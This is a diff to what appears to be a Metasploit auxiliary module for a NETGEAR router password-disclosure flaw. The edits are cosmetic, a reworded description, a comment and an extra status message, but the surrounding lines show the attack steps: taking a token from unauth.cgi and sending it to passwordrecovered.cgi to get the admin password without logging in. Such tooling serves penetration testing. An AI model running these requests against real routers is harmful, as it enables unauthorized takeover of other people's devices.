@@ -17,7 +17,8 @@ class MetasploitModule < Msf::Auxiliary
         The exploit will not complete if password recovery is set on the router.
         The password is recieved by passing the token generated from `unauth.cgi`
         to `passwordrecovered.cgi`. This exploit works on many different NETGEAR
-        products. The full list is available here: http://pastebin.com/dB4bTgxz
+        products. The full list of affected productsis available here: 
+        http://pastebin.com/dB4bTgxz
       },
       'Author'         =>
         [
@@ -52,7 +53,8 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Checking if #{rhost} is a NETGEAR router")
     
     vprint_status("Sending request to http://#{rhost}/")
-    
+
+    # will always call check no matter what
     is_ng = check
 
     res = send_request_raw({ 'uri' => '/'})
@@ -67,6 +69,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       print_status("Token found: #{token}")
+      vprint_status("Token found at #{rhost}/unauth.cgi?id=xxxxxxxx")
       
       r = send_request_raw({'uri' => "/passwordrecovered.cgi?id=#{token}"})
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
